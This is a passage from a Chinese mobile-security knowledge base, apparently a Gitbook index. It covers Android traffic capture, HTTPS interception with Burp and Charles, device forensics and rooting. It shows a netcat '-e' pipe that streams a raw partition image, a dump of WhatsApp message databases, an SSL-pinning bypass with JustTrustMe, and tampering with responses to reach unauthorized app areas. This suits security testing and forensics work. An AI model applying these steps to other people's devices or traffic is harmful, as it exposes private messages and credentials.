并在里面打开我们新拉取的文件output.pcap，通过访问File | Open。 一旦我们在 Wireshark 中打开.pcap文件，我们会注意到一个类似下面截图所示的屏幕： Wireshark 是一个开源封包分析器，它帮助我们发现敏感信息，并分析来自所有网络连接的流量数据。 在这里，我们正在搜索我们对http://attify.com所做的请求，并输入了我们的登录凭据。 现在，访问Edit并单击Find Packets。 在这里，我们需要查找我们提交登录凭据的网站，并检查String。 在这里，我们可以看到与http://attify.com/data/login.html的连接。 如果我们在底部窗格中查找有关此数据包的更多信息，我们可以看到包含我们输入的用户名和密码的请求网址。 因此，我们使用tcpdump成功捕获了网络数据，并将其存储在.pcap文件中，然后使用 Wireshark 进行分析。 然而，被动流量捕获也可以通过adb shell直接完成。 adb shell /data/local/tmp/tcpdump -i any -p -s 0 -w /mnt/sdcard/output.pcap 这里，-i代表接口。 在这种情况下，它从所有可用接口捕获数据。 -p指定tcpdump不将设备置于混杂模式（这是在执行嗅探攻击时经常使用的模式，并且不适合我们目前使用的模式）。 在使用-tcpdump标志启动模拟器时，我们还可以指定使用tcpdump。 我们还需要使用-avd标志，指定要捕获流量的 AVD 名称。 emulator -avd Android_Pentesting --tcpdump trafficcapture.pcap 主动分析 主动分析的基本规则是，使每个请求和响应通过我们定义的中间设备。 在这种情况下，我们将设置一个代理，并使所有请求和响应通过该特定代理。 此外，我们可以选择操纵和修改请求和响应中的数据包，从而评估应用程序的安全性： 为了为 HTTP 创建代理，请使用指定代理 IP 和端口以及-http-proxy标志启动模拟器。 由于我们在同一个系统上运行模拟器，我们使用IP 127.0.0.1和任何可用的端口。 在这种情况下，我们使用端口 8080。 emulator -avd Android_Pentesting –http-proxy 127.0.0.1:8080 在设备上，我们还可以访问Settings | Wi-Fi，然后长按我们连接的网络 Wi-Fi。 此外如果我们使用一个实际的设备，我们用于拦截的系统应该在同一个网络上。 一旦我们长按 Wi-Fi 连接，我们将会得到一个类似于下面的截图所示的屏幕。 此外，如果你使用真实设备执行此练习，设备需要与代理位于同一个网络。 一旦进入连接修改屏幕，请注意，代理配置会询问网络上的设备的 IP 地址和代理系统的端口。 但是，这些设置仅存于从 4.0 开始的最新版本的 Android 中。 如果我们要在小于 4.0 的设备上实现代理，我们将必须安装第三方应用程序，例如 Play Store 上可用的 ProxyDroid 一旦我们在设备/模拟器中设置了代理，请继续并启动 Burp 代理，来拦截流量。 下面Options选项卡中 Burp 代理的样子，以便有效拦截浏览器和应用程序的流量。 我们还需要检查不可见的代理，以确保我们的代理也捕获 nonproxy 请求。 为了检查代理是否工作，打开浏览器并启动网站。 然后我们能够看到它是否在代理中被拦截。 正如我们在上面的屏幕截图中看到的，我们打开了 URLhttp://attify.com，请求现在显示在 Burp Proxy 屏幕中。 因此，我们成功地拦截了来自设备和应用程序的所有基于 HTTP 的请求。 HTTPS 代理拦截 当通过 HTTP 协议进行通信时，上述方法可以正常用于应用和流量器的流量拦截。 在 HTTPS 中，由于证书不匹配，我们将收到错误，因此我们无法拦截流量。 然而，为了解决这个挑战，我们需要创建自己的证书或 Burp/PortSwigger 并将其安装在设备上。 为了创建我们自己的证书，我们需要在 Firefox（或任何其他浏览器或全局代理）中设置代理： 为了在 Firefox 中设置代理，请访问Tools中显示的Options（Mac上为Firefox | Preferences），然后访问Advanced选项卡。 在Advanced选项卡下，我们单击Network选项 在Network标签中，我们需要点击Settings来使用 Firefox 配置代理。 完成后，在我们的系统浏览器上访问 HTTPS 网站，我们能跟拦截我们设备上的流量。 这里我们将收到一个The Network is Untrusted消息。 点击I understand the Risks，并点击Add Exception。 然后，单击Get Certificate，最后单击View，然后单击Export来保存证书。 一旦证书保存在我们的系统上，我们现在可以使用adb将其推送到我们的设备。 adb push portswiggerca.crt /mnt/sdcard/portswiggerca.crt 现在，在我们的设备中，访问Settings，在Personal类别下，我们可以找到Security。 一旦我们进入Security，请注意，你可以选择从 SD 卡安装证书。 点击它使我们可以保存具有给定名称的证书，这适用于所有应用程序和浏览器，甚至是 HTTPS 站点。 通过返回到我们的浏览器，并打开 HTTPS 网站（例如https://gmail.com）来确认。 正如我们在下面的截图中可以看到的，我们在这种情况下也成功地拦截了通信： 其它用于拦截 SSL 流量的方式 还有用于 SSL 流量拦截的其他方法，以及在设备上安装证书的不同方法。 其他方法之一是从 Android 设备的/system/etc/security位置拉取cacerts.bks文件。 一旦我们拉取了它，我们就可以使用密钥工具以及 Bouncy Castle（位于 Java 安装目录中）来生成证书。 如果你在 Java 安装目录中找不到 Bouncy Castle，也可以从http://www.bouncycastle.org/latest_releases.html下载并将其放置在已知路径。 此后，我们需要挂载/system分区作为读/写分区，以便将更新的cacerts.bks证书推送回设备。 然而，为了使这种更改长期有效，如果我们使用模拟器，我们将需要使用mks.yaffs2来创建一个新的system.img然后使用它。 此外，还有其他工具可用于拦截 Android 设备的流量，例如C harles Proxy 和 MITMProxy（http://mitmproxy.org）。 我强烈建议你在 Burp 代理的知识的基础上尝试他们，因为它们在可用性方面是相同的，但是更强大。 在使用 Charles Proxy 时，我们可以直接从www.charlesproxy.com/charles.crt下载证书。 在一些渗透测试中，应用程序可能正在和服务器通信并获得响应。 例如，假设用户试图访问应用的受限区域，该应用由用户从服务器请求。 然而，由于用户没有被授权查看该区域，服务器使用403 Forbidden进行响应。 现在，我们作为渗透测试人员，可以拦截流量，并将响应从403 Forbidden改为200 OK。 因此，用户现在甚至能够访问应用的未授权区域。修改类似响应的示例可以在第8章“ARM 利用”中找到，其中我们将讨论可通过流量拦截利用的一些其他漏洞。 在应用程序中，保护流量的安全方法是让所有内容通过 HTTPS 传递，同时在应用程序中包含一个证书。 这样做使得当应用程序尝试与服务器通信时，它将验证服务器证书是否与应用程序中存在的证书相对应。 但是，如果有人正在进行渗透测试并拦截流量，则由渗透测试程序添加的设备使用的新证书（如 portswigger 证书）与应用程序中存在的证书不匹配。 在这些情况下，我们必须对应用程序进行逆向工程，并分析应用程序如何验证证书。 我们甚至可能需要修改和重新编译应用程序。 使用封包捕获来提取敏感文件 现在我们来看看如何使用 Wireshark 从流量数据中提取敏感文件。 为了做到这一点，我们可以捕获数据包，并加载到 Wireshark 进行分析。 从网络捕获中提取文件的基本概念是，它们含有指定文件类型的头部（multipart/form-data）。 以下是从网络流量捕获中提取任何类型文件的步骤： 在 Wireshark 中，只需访问编辑并从包详细信息中搜索字符串multipart。 一旦我们收到了向服务器发送 POST 请求的数据包（或者极少数情况下是 GET），右键单击该数据包，然后点击Follow TCP Stream。 此后，根据文件起始值（如 PDF 的情况下为%PDF），从以下选项中选择Raw，然后使用扩展名.pdf保存文件。 因此，我们拥有了最终的 PDF，通过 Android 设备上传到网站，而且我们恰巧在我们的渗透中开启了网络捕获。 我们还可以使用其他工具，如 Windows 上的 NetworkMiner（可从http://www.netresec.com/?page=NetworkMiner下载），它提供了一个精心构建的 GUI 来与之交互，并显式指定保存的网络流量捕获文件。 总结 在本章中，我们了解了在 Android 设备上执行流量分析的各种方法。 此外，我们会继续拦截来自应用程序和浏览器的 HTTP 和 HTTPS 流量数据。 我们还看到如何从网络捕获信息中提取敏感文件。 在下一章中，我们将介绍 Android 取证，并使用手动方式以及在不同工具的帮助下，从 Android 设备中提取一些敏感信息。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-10-25 14:18:27 "},"知识库/05.移动安全/00.Android/05.Android 设备取证.html":{"url":"知识库/05.移动安全/00.Android/05.Android 设备取证.html","title":"05.Android 设备取证","keywords":"","body":"取证类型 取证是使用不同的手动和自动方法从设备中提取和分析数据。它可以大致分为两类： 逻辑采集：这是的一种取证方法，其中取证员与设备交互并从文件系统提取数据。该数据可以是任何内容，诸如应用特定数据，联系人，通话记录，消息，web 浏览器历史，社交网络用户信息和财务信息。逻辑采集的优点是，在大多数情况下比物理采集更容易获取逻辑信息。然而，在一些情况下，该方法的一个限制是，在这种情况下的证据（智能手机及其数据）具有被篡改的高风险。 物理采集：这意味着对整个物理存储介质进行逐位拷贝。我们还可以在执行物理采集时定位不同的单个分区。与逻辑采集相比，这种方法慢得多，但更可靠和可信赖。此外，为了在智能手机上执行物理采集，检查者需要熟悉不同类型的文件系统，例如 Yet Another Flash File System 2（YAFFS2），ext3，ext4，rfs 等。 文件系统 在我们深入取证以及从设备提取数据之前，我们应该清楚地了解文件系统类型和它们之间的差异。正如我们前面讨论的，在 Android 中进行物理采集有点棘手，一个主要原因是文件系统不同。 Android 文件系统的主分区通常被分区为 YAFFS2。在 Android 中使用 YAFFS2 的原因是，它为设备提供了优势，这包括更高的效率和性能，以及更低的占用空间。几年前，当 Android 刚刚推出时，取证是平台上的一个大问题，因为几乎没有支持 YAFFS2 文件系统格式的取证工具。 SD 卡是 FAT32 类型，是正常系统用户中的共享格式。因此，为了获取 SD 卡的映像，可以使用任何常规的数据采集取证工具。 制作副本或创建现有数据系统映像的最有名的工具之一是 dd，它从原始来源到系统进行逐块复制。然而，由于该工具的一些缺点，例如缺少内存块以及跳过坏块，会导致数据损坏，因此不推荐在取证调查期间使用。在接下来的章节中，我们将深入介绍 Android 文件系统，并将研究如何以最有效的方式从文件系统中提取数据。 Android 文件系统分区 正如我们在前面的章节中讨论的，Android 基于 Linux 内核，并从 Linux 本身派生其大部分功能和属性。 在 Android 中，文件系统被划分为不同的分区，每个分区都具有重要意义。 为了在 Android 设备上查看分区，我们可以使用adb shell然后查看proc下的mtd文件，如下面的命令所示。 在一些不存在mtd文件的设备中，在proc下有另一个名为partitions的文件，如下面的命令所示： adb shell cat /proc/mtd 以下是在设备上执行上述命令来列出所有分区后的输出的屏幕截图。 正如我们在上面截图中看到的，存在各种文件系统分区及其各自的大小。 在大多数 Android 设备上，我们通常会看到一些数据分区，如system，userdata，cache，recovery，boot，pds，kpanic和misc，它们安装在dev列指定的不同位置。 为了看到不同的分区和类型，我们可以在adb shell中键入mount。 正如我们在下面的截图中可以看到的，通过执行mount命令列表，所有不同的分区及其位置将被挂载： 使用dd提取数据 dd工具是取证中最常用的工具之一，以便为数据提取过程创建映像。 换句话说，它用于将指定的输入文件转换并复制为输出文件。 通常在分析期间，我们不允许与证据直接交互和更改。 因此，获得设备文件系统的映像，然后对其执行分析总是一个好的选择。 默认情况下，dd工具在大多数基于 Linux 的系统中，以及在 Android 设备中的/system/bin中都存在。 如果它不存在于你的设备中，您可以安装 BusyBox，它将安装dd以及一些其他有用的二进制文件。 你可以从 BusyBox 应用程序（https://play.google.com/store/apps/details?id=stericson.busybox）获取dd的二进制文件，或者你甚至可以自己交叉编译。 dd的标准语法如下: dd if = [source file which needs to be copied] of = [destination file to be created] 有几个命令行选项可以与dd一起传递，其中包括： if：这是要复制的输入文件 of：这是内容要复制给它的输出文件 bs：这是块大小（一个数字），指定dd复制映像的块大小 skip：这是在开始复制过程之前要跳过的块数 让我们现在继续，并取得现有分区之一的映像来进行取证 我们需要找到的第一个东西是不同的分区，它们存在于我们的 Android 设备上，就像我们之前做的一样。 这可以通过查看/proc/mtd文件的内容来完成。 接下来，我们需要了解数据分区的位置，因为这里我们采集数据分区的备份。 在这种情况下，它位于mtdblock6。 这里，我们将启动dd，并将映像存储在sdcard中，稍后我们将使用adb pull命令拉取映像。 adb pull命令只是简单地允许你将文件从设备拉取到本地系统。 复制可能需要一些时间，一旦复制完成，我们可以退出adb shell，访问我们的终端，并键入以下代码： adb pull /mnt/sdcard/data.img data.img 我们还可以使用 Netcat 工具将映像直接保存到远程位置/系统。 为此，我们首先需要将端口从设备转发到系统。 adb forward tcp:5566 tcp:5566 同时，我们需要在这里启动 Netcat 工具，监听端口 5566。 nc 127.0.0.1 5566 > data.img 此后，我们必须执行adb shell进入设备，然后启动dd工具，并将输出转发到 Netcat。 nc -l -p 5566 -e dd if=/dev/block/mtdblock6 这将把映像保存到系统中，而不是保存在设备上的任何位置，然后再拉取它。 如果你的手机上没有dd二进制，你也可以安装 BusyBox 来获得dd二进制。 开始取证调查之前应该确保的一件事是，检查设备是否被设置为在超级用户模式下操作，这通常需要设备的 root。 然而，我们遇到的所有设备并不都是 root。 在这些情况下，我们将使用我们的自定义恢复映像来启动手机，然后 root 设备。 使用 Andriller 提取应用数据 Andriller 是由 Denis Sazonov 以 Python 编写的开源多平台取证工具，它有助于从设备中提取一些基本信息，并且有助于进行取证分析。 分析完成后，将生成 HTML 格式的取证报告。 为了下载它，我们可以访问官方网站http://android.saz.lt/cgi-bin/download.py并下载必要的包。 如果我们在 Linux 或 Mac 环境中，我们可以简单地使用wget命令来下载并解压软件包。 因为它只是一个 Python 文件，以及一些其他必要的二进制文件，所以没有必要安装它; 相反，我们可以直接开始使用它。 wget https://github.com/den4uk/andriller/archive/refs/tags/3.6.3.tar.gz Saving to: 'Andriller_multi.tar.gz' 100%[=============================>] 1,065,574 114KB/s in 9.2s 2013-12-27 04:23:22 (113 KB/s) - 'Andriller_multi.tar.gz' saved [1065574/1065574] tar -xvzf Andriller_multi.tar.gz 一旦解压完成，我们可以访问 Andriller 文件夹 下载对应的adb工具以及库 sudo apt-get install android-tools-adb python3-tk python3 -m venv env source env/bin/activate pip install andriller -U python -m andriller 一旦开始运行，我们会注意到，它会打印出设备的几个信息，如 IMEI 号码，内部版本号和安装的社交网络应用程序。 这里，它检测到 WhatsApp 应用程序以及与其相关联的电话号码，因此它将继续并拉取 WhatsApp 应用程序的所有数据库。 分析完成后，我们将看到类似以下屏幕截图的屏幕： 如果我们查看它为我们创建的 HTML 文件，它将显示一些关于设备的基本信息，如下面的屏幕截图所示。 它还在文件夹db下的同一文件夹目录中创建所有数据库的转储。 使用 AFLogical 提取所有联系人、通话记录和短信 AFLogical 是由 viaForensics 编写的工具，以便从设备创建逻辑采集并将结果呈现给取证员。它从设备中提取一些关键组件，包括短信，联系人和通话记录。 为了使用 AFLogical，我们需要从 GitHub 库https://github.com/viaforensics/android-forensics下载项目的源代码。下载后，我们可以将此项目导入我们的 Eclipse 工作区并进行构建。我们可以从我们现有的代码中访问File | New | Other | Android | Android Project，然后选择下载的源代码路径。 一旦我们将项目导入到我们的工作区，我们就可以在我们的设备上运行它，方法是右键单击项目并选择“运行为 Android 应用程序”。一旦我们运行它，我们将注意到，我们的设备上的AFLogical应用程序提供了选项来选择要提取什么信息。在以下屏幕截图中，你将看到 AFLogical 在设备上运行，并询问用户有关要提取的详细信息： 我们将检查所有东西，然后单击Capture。 AFLogical 将开始从不同来源捕获详细信息，并将捕获的详细信息保存在 SD 卡中的csv文件中。 捕获过程完成后，我们会注意到一个警告框。 我们现在可以查看我们的 SD 卡路径，我们可以找到保存的.csv文件。 然后我们可以在任何.csv文件查看器中打开这些.csv文件来查看详细信息。 因此，AFLogical 是一个快速有效的工具，用于从设备中提取一些信息，如联系人，通话记录和消息。 手动转储应用的数据库 既然我们已经看到，很多工具可以帮助我们进行取证，我们还可以使用adb和我们的手动技能从设备中提取一些信息。 正如我们之前学到的，应用程序文件存储在/data/data/[应用程序的包名]/位置。 由于大多数应用程序也使用数据库来存储数据，我们注意到在名为directory的包中有另一个名为databases的文件夹。 这里需要注意的一点是，这只会帮助我们从使用数据库的应用程序中提取信息，以便转储应用程序和其他相关信息。 在某些应用程序中，我们可能还会注意到，应用程序将数据存储在 XML 文件中或使用共享首选项，我们需要手动审计它们。 Android 使用 SQLite 数据库（我们将在下一章深入讨论）与.db文件格式。 下面是手动提取所有数据库的步骤： 进入设备，并创建一个文件夹来存储所有数据库 查找所有.db文件并将其复制到创建的文件夹 压缩文件夹并拉取它 因此，我们可以使用adb shell查找/data/data/location中的所有数据库文件，将它们压缩到归档文件中，然后将其拉取出来。 在 SD 卡中创建一个名为BackupDBS的文件夹 为此，我们可以简单地执行adb shell，然后在/mnt/sdcard下创建一个名为BackupDBS的文件夹： adb shell mkdir /mnt/sdcard/BackupDBS 查找所有.db文件并将其复制到BackupDBS 为此，我们可以使用一个简单的命令行绝技来查找和复制/data/data中的所有.db文件。 我们首先使用find命令查找所有.db文件。 在以下命令中，我们使用find工具，并指定从当前位置搜索，然后查找具有任何文件名（通配符*）以及扩展名db的所有文件（即*.db），以及类型为文件f。 find . -name \"*.db\" -type f 下面的截图展示了输出： 现在，我们可以简单地使用cp和find，以便将其复制到BackupDBS目录 find . -name \"*.db\" -type f -exec cp {} /mnt/sdcard/BackupDBS \\; 现在，如果我们查看/mnt/sdcard下的BackupDBS目录，我们的所有数据库都已成功复制到此位置。 压缩并拉取文件。 现在，在同一位置，我们可以使用tar工具创建一个压缩包，并使用adb pull。 tar cvf backups.tar BackupDBS/ 然后，从系统中，我们可以简单地像这样拉取它。 此方法也可以用于通过在/data/app和/data/app-private文件夹中查找文件类型.apk，来从手机中拉取所有.apk文件。 如果我们仔细看一看，在我们的backups.tar中，还有一个名为msgstore.db的 WhatsApp 应用程序的数据库。 让我们继续分析和研究数据库内部的内容。 为此，我们需要首先解压我们刚才拉取的tar归档文件。 tar -xvf backups.tar 现在，为了分析名为msgstore.db的 WhatsApp 的 SQLite 数据库，我们可以下载并使用任何 SQLite 浏览器。 对于本书，我们使用 SQLite 数据库浏览器，可以从http://sourceforge.net/projects/sqlitebrowser/下载。 现在，如果我们在 SQLite 数据库浏览器中打开msgstore.db文件并访问浏览器数据，我们可以在 SQLite 浏览器中看到我们的所有 WhatsApp 对话。 在以下截图中，我们可以看到在 SQLite 数据库浏览器中打开的msgstore.db，它显示 WhatsApp 应用程序的所有聊天对话： Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-10-25 17:02:24 "},"知识库/05.移动安全/01.安卓ROOT抓包及绕过SSLPinning.html":{"url":"知识库/05.移动安全/01.安卓ROOT抓包及绕过SSLPinning.html","title":"01.安卓ROOT抓包及绕过SSLPinning","keywords":"","body":"这里使用公司的小米6做为测试机型 安卓手机相关科普 基本分区 BootLoader（fastboot） Android 系统虽然也是基于 Linux 系统的，但是由于 Android 属于嵌入式设备，并没有像 PC 那样的 BIOS 程序。 取而代之的是 Bootloader —— 系统启动加载器。 一旦bootloader分区出了问题，手机变砖就很难救回了。除非借由高通9008或者MTK-Flashtool之类更加底层的模式来救砖。 一般刷机不动这个分区。 recovery 用于存放recovery恢复模式的分区，刷机、root必须要动的分区。里面有一套linux内核，但并不是安卓系统里的那个，相当于一个小pe的存在。现阶段的刷机、root基本都要用第三方rec来覆盖官方rec。 boot 引导分区，虽然说是引导，但实际是在bootloader之后，与recovery同级的启动顺序。里面装了安卓的linux内核相关的东西，magisk就是修改了这部分程序，实现的root权限的获取。 userdata（/Data） 用户数据分区，被挂载到/data路径下。内置存储器（内置存储卡）实际也存在这个分区里，用户安装的apk、app的数据都在这个分区。目前主流安卓版本中data分区通过fuse进行了强制加密，密码一般都是屏锁密码，且加密的data分区未必能在recovery下成功解密，所以有时刷机需要清除整个data分区。 cache 缓存分区，一般用于OTA升级进入recovery前，临时放置OTA升级包以及保存OTA升级的一些临时输出文件。 安卓系统启动流程 一般来说，安卓系统的刷机都是在fastboot和recovery进行的，因为此时安卓系统本身还没有启动，直接无视各种权限进行操作。 fastboot通常又被叫做线刷模式，PC端通过fastboot程序直接向手机刷写分区镜像文件，fastboot无法进行更加细致的操作，一刷就是整个分区，而不能对某个、某些文件进行特定的修改。 recovery模式下可以刷入带有脚本的zip包，可以实现对系统的增量修补，修改特定文件等更细致、强大的功能，但问题在于官方的recovery拥有签名校验，非官方的zip包无法通过官方的recovery刷入，于是我们需要刷入第三方的recovery来运行非官方签名的刷机包的刷入。于是我们就需要在fastboot下刷入第三方的recovery。 但是，fastboot的刷入也有限制，未解锁的fastboot（也就是bootloader锁、bl锁）不允许刷入非官方签名过的img镜像，所以我们需要对bootloader进行解锁，国内允许解锁bl锁的厂商就只有小米了，所以像搞机得用小米的机子。 通过解锁bootloader来刷入第三方的recovery，再通过第三方的recovery来刷入第三方的刷机包（如magisk或是其它的系统)达到直接或间接修改boot、system等分区的文件，这就是刷机的真谛。 其中Magisk作用于boot.img的阶段。Magisk的安装实际是将boot分区导出然后进行patche后再重新刷入。magisk通过直接修改boot.img中的linux内核相关文件实现了root权限的获取，也是由于其在很靠前的位置，可以通过在system分区挂载时，额外挂载分区、文件、目录来实现对系统文件的替换、修改而不修改原始文件。 开发者模式 开发者模式是安卓给安卓开发人员提供的高级调试，以小米6为例子，打开开发者模式 点击设置->我的设备->全部参数 多次点击MIUI版本，当出现您已处于“开发者模式，无需进行此操作”即表示已进入开发者模式 在设置->更多设置->开发者选项->开启开发者选项 点击开启开发者选项，即表示已开启开发者选项 解锁bootloader 用于解锁小米手机的bootloader的工具包，如果你的手机有bl锁就需要进行解锁。 bl锁解锁教程见“小米、红米手机解锁bootloader” 下载地址：http://www.miui.com/unlock/download.html 在需要解锁的设备中登录已经具备解锁权限的小米账号，并进入“设置 -> 开发者选项 -> 设备解锁状态”中绑定账号和设备； 绑定成功后，手动进入Bootloader模式（关机后，同时按住开机键和音量下键）； 下载手机解锁工具(解锁工具官网)，在PC端的小米解锁工具中，登录相同的小米账号，并通过USB连接手机； 点击PC端解锁工具的“解锁”按钮，根据提示信息等待指定时间后再次尝试或者立即解锁； 解锁Bootloader过程中可能遇到的问题Q：解锁工具提示“账号设备不一致”是怎么回事？ A：这是在解锁过程中没有通过账号与设备验证，解决办法是先将手机升级到最新的稳定版或者从稳定版卡刷到最新的开发版，在待解锁的设备和解锁工具上要登陆同一个账号，并进入“设置 -> 开发者选项 -> 设备解锁状态”中绑定账号和设备。 Q：解锁工具提示“无法获取手机信息”是怎么回事？ A：这种情况一般是电脑上的设备驱动没有装好，可以尝试重插USB线或者换个USB接口或者换根USB线来等待电脑慢慢安装驱动，或在工具右上角驱动安装模块中主动安装驱动。 Q：解锁失败显示“账号与设备的绑定时间太短，xxx个小时后再解锁” A：在售的新机型一般需要等待，用户账号安全评分较低的需要等待，等待时间目前是7天起，如果本年度解锁手机数超过2台，等待时间会相应增长。 Q：解锁失败显示“此账号本月解锁次数达到上限” A：一个小米账号每月限制解锁一台设备。 Q：解锁失败显示“此账号本年累计解锁次数已达上限” A：一个小米账号每年限制解锁4台不同设备。 Q：解锁失败显示“账号权限不足或者账号受限” A：账号存在安全风险，无法处理解锁操作，建议更换账号。 Q：解锁失败显示“未知错误-1” A：网络异常，请更换时间段或更换网络进行解锁。 手机root 这里我选择的是先线刷一个稳定版本的包，然后曲线救国安装开发版本包 线刷：http://www.miui.com/shuaji-393.html 卡刷：http://www.miui.com/shuaji-329.html 其中线刷的时候千万不要上锁，上锁之后解锁很麻烦 卡刷在手动选择安装包的时候，也需要手工开启 点击设置->我的设备->系统更新，多次点击logo，再点右上角的三个点（更多），即可看到手动选择安装包 当刷上开发版本之后，在授权管理处，将手机root 刷入第三方Recovery 由于官方的recovery模式功能有限，且不允许刷入非官方签名的刷机包，于是我们需要刷入第三方recovery。 目前全球最大的主流第三方recovery是TWRP项目，其官网为https://twrp.me/ 下载TWRP Recovery 点击devices 选择xiaomi 选择机型 点击下载 下载后得到一个镜像文件 这个时候就已经准备好了recovery文件了 刷入recovery 注：需要用到的fastboot.exe，在adb工具包里是有的：https://developer.android.com/studio/releases/platform-tools#downloads 手动进入Bootloader模式（关机后，同时按住开机键和音量下键)，通过数据线连接到电脑。 通过cmd或powershell打开fastboot工具 # 查看已连接的设备 fastboot.exe devices # 刷入下载好的文件 fastboot.exe flash recovery recovery.img 其命令原型为 fastboot flash [要刷入的分区] [要刷入的镜像文件] 注意：这里一定要注意手机一定要解开bootloader锁才能写入成功 此时twrp已被刷入，但别急着重启，直接重启系统会导致系统将recovery还原，我们需要直接进入到twrp中。 先按下音量加和电源键，在手机屏幕熄灭时松开电源键，手机显示小米logo并震动时松开音量键，等待片刻即可进入recovery。 进入Recovery 注：进入recovery的按键组合是音量加与电源键长按 首次进入twrp时系统会提示是否修改系统分区，先去点击Change Language，将语言改成中文。然后将蓝色的条滑动到右侧，表示允许修改。 图片引用一下GLRpiz师傅的图，我也是按照GLRpiz师傅的步骤一步一步做出来的 刷入magisk Magisk的官方下载连接在：https://github.com/topjohnwu/Magisk 下载后我们得到了Magisk-v23.0.apk文件 注意：Magisk的apk安装包经过特殊处理，扩展名改为zip即为recovery下使用的刷机包，apk即为安卓使用的magisk管理app。 刷入安装包 警告：以下操作将会清空手机内所有用户数据 将手机进入到TWRP Recovery下，通过数据线连接电脑，电脑此时会弹出一个MTP设备，我们会发现文件夹和文件都是乱码的，这是因为高版本安卓下整个Data分区使用了fuse作为强制加密，Recovery下无法将其解密。但是我们必须要通过某种渠道，将刷机包放在Recovery能够访问的路径中，此时有两种选择，OTG插U盘读取刷机包，或者直接格式化整个Data分区，此处使用后者 点击TWRP的清除按钮、选择格式化Data分区 成功后点击重启按钮中的Recovery，手机将重启到TWRP Recovery中，此时电脑中的MTP设备就会变成一个空设备，这时我们在将Magisk-v23.0.apk改名为Magisk-v23.0.zip复制到手机中，点击安装按钮刷入该刷机包。我们需要到/sdcard路径里去找这个包 选中后，滑动确认刷入，当出现done字样且控制台不再有输出，点击reboot system重启系统即可。 此时magisk应该以及成功装入到boot分区了 注意：重启系统后，data分区将被安卓系统本身再次格式化、并进行强制加密。如果中间出了什么岔子，需要再到TWRP中刷入刷机包，需要再次手动格式化Data分区。 启动Magisk 进入系统后会发现Magisk还需要进一步安装，此时需要将Magisk-v23.0.apk安装到手机中，之后Magisk会提示系统需要重启之类的，等待系统重启再次进入系统 安装Edxposed 安卓7以上就不支持xposed了，因为xposed没有去适配新系统，在这里我们使用开源的Edxposed 首先需要在Magisk上先安装riru，因为riru-edxposed依赖Riru，这里需要注意，riru-Edxposed 不支持riru 26 的版本，所以在这里需要在github上下载低一个版本的riru，比如V25版本，https://github.com/RikkaApps/Riru/releases 然后安装 justtrustme，这个justtrustme是无图形化的app，用于解决app内ssl证书校验的，简单来说，JustTrustMe 是将 APK 中所有用于校验 SSL 证书的 API 都进行了 Hook，从而绕过证书检查。 那么这里就有疑问了，为什么不直接安装justtrustme？ 因为justtrustme依赖于xposed框架，它是xposed框架里支持的一个模块，而xposed框架需要root且magisk的支持 安装好了之后，在Edxposed框架->模块中，就会出现justtrustme的这个模块，然后重启一下，抓包测试 抓包测试 注意，安装好模块且启用之后，需要重启 由于之前将Charles的根证书写到了/system/etc/security/cacerts,这里我将该证书关闭，使用Edxposed+justtrustme来抓包 然后设置代理，在Charles中可以看到可以抓到weibo，支付宝 ROOT后写入根证书 安卓7.0以后，安卓不信任用户安装的证书，所以抓https时无法解码请求，对于第三方应用，需要将证书添加为系统证书，比如使用安卓模拟器(兼容性差，很多应用闪退)，使用xposed框架等，这里再推荐一种添加系统证书的方法 注意：需要手机有root权限,以下操作以小米6为准,其他品牌手机操作可能有差别 导出证书（以Charles为准） help --> SSL Proxying --> Save Charles Root Certificate... 制作安卓系统证书 将导出的证书计算hash值，并生成系统系统预设格式证书文件 //.cer格式证书 openssl x509 -inform DER -subject_hash_old -in 证书文件.cer //.pem格式证书 openssl x509 -inform PEM -subject_hash_old -in 证书文件.pem //cer格式 openssl x509 -inform DER -text -in xxx.cer > 43340bc0.0 //pem格式 openssl x509 -inform PEM -text -in xxx.pem > 43340bc0.0 最后编辑一下输出的文件，把 -----BEGIN CERTIFICATE----- 到最后的这部分移动到开头。结果如下 上传证书 adb push 43340bc0.0 /sdcard/Download adb root shell adb shell mount -o remount,rw /system cp /sdcard/Download/43340bc0.0 /system/etc/security/cacerts/ chmod 644 /system/etc/security/cacerts/43340bc0.0 mount -o remount,ro /system 自己入手了一台测试机是Google的Pixel3，在挂载/system目录的时候会报错（自己刷的安卓9，boot.img 写入magisk） 这时，只需要挂根目录（/）就可以了 最后一步必不可少，把拥有写权限的system目录更改为原设定为只可读，不然就会变砖 写进去之后，在系统证书中，就可以看到我们添加的证书了 安卓9以上需要先解锁verity $ adb root #restarting adbd as root $ adb remount #dm_verity is enabled on the system partition. #Use \"adb disable-verity\" to disable verity. #If you do not, remount may succeed, however, you will still not be able to write to these volumes. remount succeeded $ adb disable-verity #Verity disabled on /system #Now reboot your device for settings to take effect $ adb reboot $ adb root #restarting adbd as root $ adb remount #remount succeeded 解锁后一样的流程 cd /data/local/tmp cp 9a5ba575.0 /system/etc/security/cacerts/ cd /system/etc/security/cacerts chmod 644 9a5ba575.0 reboot 然后，为了防止丢失ROOT，需要再次启用verity锁定 $ adb root $ adb remount #remount succeeded $ adb enable-verity $ adb reboot $ adb root $ adb remount #remount disable 参考链接 https://forum.butian.net/share/1068 https://forum.butian.net/share/1069 https://blog.csdn.net/weixin_31702225/article/details/117694829 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-18 10:35:02 "},"知识库/05.移动安全/02.IOS抓包及绕过SSL.html":{"url":"知识库/05.移动安全/02.IOS抓包及绕过SSL.html","title":"02.IOS抓包及绕过SSL","keywords":"","body":"ios app 在没有SSL双向认证的情况下，是不用越狱就可以抓到https的，在这里使用Charles为例 移动设备下载证书 help --> SSL Proxying --> Install Charles Root Certificate on a Mobile Device Remote Browser.. 首先配置好WiFi 代理，然后在Safari浏览器中输入chls.pro/ssl 安装证书 然后到设置->通用->VPN 与设备管理 点击Charles的证书，点击安装 信任证书 打开设置-通用-关于本机-证书信任设置，打开刚刚安装的证书开关 测试 app.crctrust.com:8444 这个app在安卓平台是okhttp框架，且ssl为双向认证，导致无法抓包，但是在ios上是可以抓包如下，这个项目也只做到了ios就到此为止了 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:21:51 "},"知识库/05.移动安全/03.Pixel3刷机.html":{"url":"知识库/05.移动安全/03.Pixel3刷机.html","title":"03.Pixel3刷机","keywords":"","body":"刷机前置信息 目的：脱壳 解锁BL 